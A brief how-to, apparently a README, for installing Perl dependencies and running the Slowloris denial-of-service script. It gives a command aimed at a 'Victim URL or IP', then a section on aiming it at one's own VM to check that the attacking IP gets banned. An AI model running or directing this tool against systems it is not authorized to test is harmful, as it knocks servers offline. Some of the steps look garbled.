How use Slowloris

Requirements:
# sudo apt-get update  
# sudo apt-get install perl
# sudo apt-get install libwww-mechanize-shell-perl
# sudo apt-get install perl-mechanize

1)Download slowloris.pl
2)Open Terminal
2)# cd /thePathToYourSlowloris.plFile
3)# ./slowloris.pl
4)# perl slowloris.pl -dns (Victim URLÂ or IP) -options

Done
Laera Loris

TO TEST YOUR VM :

Try using command :
perl slowloris.pl -dns [STATIC IP VM] -port [SSH PORT VM]
perl slowloris.pl -dns [STATIC IP VM] -port 80
perl slowloris.pl -dns [STATIC IP VM] -port 443

Slowloris should not be able to send any packets and IP should be banned from VM.

